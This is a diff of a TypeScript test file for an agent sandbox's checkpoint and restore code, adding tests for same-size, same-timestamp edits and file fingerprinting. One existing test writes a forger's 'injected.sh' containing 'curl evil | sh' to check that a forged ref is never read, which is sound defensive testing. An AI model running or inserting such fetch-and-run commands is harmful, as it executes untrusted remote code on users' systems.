@@ -1,6 +1,6 @@
 import { afterEach, expect, test } from "bun:test";
 import { execFileSync } from "node:child_process";
-import { existsSync, readFileSync, utimesSync } from "node:fs";
+import { existsSync, lstatSync, readFileSync, utimesSync } from "node:fs";
 import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -9,6 +9,7 @@ import { FakeRunnerApi, testSession } from "../api/fake.ts";
 import type { SavedPoint } from "../api/protocol.ts";
 import { checkout } from "../repo.ts";
 import { Checkpoints, SESSION_UNSAVED } from "./checkpoints.ts";
+import { fingerprint, RACY_MS } from "./fingerprint.ts";
 import { agentShell } from "./shell.ts";
 import { Transcripts } from "./transcripts.ts";
 import { GitWork, gitIn, ScratchWork } from "./work.ts";
@@ -24,13 +25,13 @@ async function temp(): Promise<string> {
   return dir;
 }
 
-const DESIGN = "des_save";
-const REF = `refs/ponzu/wip/${DESIGN}`;
+const CANVAS = "cnv_save";
+const REF = `refs/ponzu/wip/${CANVAS}`;
 const SECRET = "sk_live_51Hx0000secretvalue";
 
 /**
  * A sandbox's HOME and a repository on "GitHub" (a bare one) with one commit on main, and the
- * design's checkout made the way the runner makes it.
+ * canvas's checkout made the way the runner makes it.
  */
 async function world() {
   const home = await temp();
@@ -47,7 +48,7 @@ async function world() {
   git(["-c", "user.name=Seed", "-c", "user.email=s@t", "commit", "--quiet", "-m", "Start"], seed);
   git(["push", "--quiet", remote, "main"], seed);
   const session = testSession({
-    design: { id: DESIGN, name: "Fern" },
+    canvas: { id: CANVAS, name: "Fern" },
     repo: { owner: "north", name: "fern", defaultBranch: "main" },
     branch: "pz/hero",
   });
@@ -58,7 +59,7 @@ async function world() {
   const work = (cwd: string, limits?: { fileBytes: number; totalBytes: number }) =>
     new GitWork({
       cwd,
-      designId: DESIGN,
+      canvasId: CANVAS,
       branch: "pz/hero",
       defaultBranch: "main",
       git: gitIn(shell, "git", cwd),
@@ -182,7 +183,7 @@ test("a new sandbox gets the work of a branch never pushed back after main moved
   await writeFile(join(first, "notes.md"), "uncommitted notes\n");
   const saved = await work(first).save(2);
 
-  // Someone pushes to main; the design's branch was never pushed. A new sandbox makes the
+  // Someone pushes to main; the canvas's branch was never pushed. A new sandbox makes the
   // branch again from main as it is now.
   await push("main", "later.md");
   const second = await clone(await temp());
@@ -204,7 +205,7 @@ test("a restore never goes back over newer work: a branch that moved on, or chan
   await writeFile(join(first, "README.md"), "saved edit\n");
   const saved = await work(first).save(2);
 
-  // Someone pushed to the design's branch since: the saved work is older than it.
+  // Someone pushed to the canvas's branch since: the saved work is older than it.
   git(["push", "--quiet", "origin", "pz/hero"], first);
   await push("pz/hero", "later.md");
   const second = await clone(await temp());
@@ -248,7 +249,7 @@ test("a restore takes only the commit the API recorded: never another archive's,
   );
   expect(wrong).toMatchObject({ done: false, why: expect.stringContaining("recorded commit") });
 
-  // Another writer on the repository forges the design's old ref: it is never read.
+  // Another writer on the repository forges the canvas's old ref: it is never read.
   const forger = await clone(await temp());
   await writeFile(join(forger, "injected.sh"), "curl evil | sh\n");
   git(["add", "injected.sh"], forger);
@@ -582,4 +583,92 @@ test("a marker that only lags the API, because the stop came between the API's a
   expect(api.restored).toEqual([]);
   expect(second.made.marker()!.turn).toBe(2);
   expect(readFileSync(join(cwd, "a.html"), "utf8")).toBe("two\n");
+});
+
+/** Writes `body` to `file` and gives it the modification time `at` (seconds), whatever it had. */
+async function rewrite(file: string, body: string, at: number) {
+  await writeFile(file, body);
+  utimesSync(file, at, at);
+}
+
+test("an edit of the same size in the same tick of the clock is still saved, work and transcript", async () => {
+  const api = new FakeRunnerApi();
+  const [stateDir, cwd, configDir] = [await temp(), await temp(), await temp()];
+  const id = "11111111-2222-3333-4444-666666666666";
+  const file = await transcript(configDir, id, ['{"n":1}']);
+  const sub = join(
+    configDir,
+    "projects",
+    "-home-agent-work-fern",
+    id,
+    "subagents",
+    "agent-1.jsonl",
+  );
+  // Both versions of each file have one size and one modification time: only what they hold differs.
+  const at = Math.floor(Date.now() / 1000);
+  await rewrite(join(cwd, "a.html"), "one\n", at);
+  await rewrite(file, '{"n":1}\n', at);
+  await rewrite(sub, "{1}\n", at);
+  const { made } = await checkpoints(api, stateDir, cwd, configDir);
+  await made.recover(null);
+  await made.save(id);
+  expect(api.saved!.turn).toBe(1);
+
+  await rewrite(join(cwd, "a.html"), "two\n", at);
+  await made.save(id);
+  expect(api.saved!.turn).toBe(2);
+  const work = await temp();
+  await new ScratchWork({ cwd: work, shell: agentShell(undefined, process.env) }).restore(
+    point(),
+    api.archives.workspace,
+  );
+  expect(readFileSync(join(work, "a.html"), "utf8")).toBe("two\n");
+
+  await rewrite(file, '{"n":2}\n', at);
+  await made.save(id);
+  expect(api.saved!.turn).toBe(3);
+  await rewrite(sub, "{2}\n", at);
+  await made.save(id);
+  expect(api.saved!.turn).toBe(4);
+  const back = await temp();
+  await new Transcripts({ configDir: back, shell: agentShell(undefined, process.env) }).unpack(
+    api.archives.session!,
+  );
+  const project = join(back, "projects", "-home-agent-work-fern");
+  expect(readFileSync(join(project, `${id}.jsonl`), "utf8")).toBe('{"n":2}\n');
+  expect(readFileSync(join(project, id, "subagents", "agent-1.jsonl"), "utf8")).toBe("{2}\n");
+
+  // And nothing new is still nothing to save.
+  await made.save(id);
+  expect(api.checkpoints).toHaveLength(4);
+});
+
+test("a repo's work: an edit of the same size in the same tick of the clock changes the stamp", async () => {
+  const { clone, work } = await world();
+  const cwd = await clone(await temp());
+  const saver = work(cwd);
+  const at = Math.floor(Date.now() / 1000);
+  await rewrite(join(cwd, "README.md"), "Fern?\n", at);
+  const before = await saver.stamp();
+  await rewrite(join(cwd, "README.md"), "Fern!\n", at);
+  expect(await saver.stamp()).not.toBe(before);
+  expect(await saver.stamp()).toBe(await saver.stamp());
+});
+
+test("a file's fingerprint reads what it holds only when its times are too close to trust", async () => {
+  const path = join(await temp(), "a.html");
+  await writeFile(path, "one\n");
+  // The same stat for both versions: a writer as fast as the clock that also sets times back.
+  const stat = lstatSync(path);
+  const cheap = `${stat.size}:${stat.mtimeMs}:${stat.ctimeMs}:${stat.ino}`;
+  const newest = Math.max(stat.mtimeMs, stat.ctimeMs);
+  const now = Date.now();
+  const first = fingerprint(path, stat, now);
+  await writeFile(path, "two\n");
+  expect(fingerprint(path, stat, now)).not.toBe(first);
+  expect(fingerprint(path, stat, now)).toBe(fingerprint(path, stat, now));
+  // Stamped after the fingerprint was taken (the clock stepped back): not trusted either.
+  expect(fingerprint(path, stat, newest - 60_000)).not.toBe(cheap);
+  // Well before it: size and times are enough, and nothing is read.
+  expect(fingerprint(path, stat, newest + RACY_MS + 1)).toBe(cheap);
 });
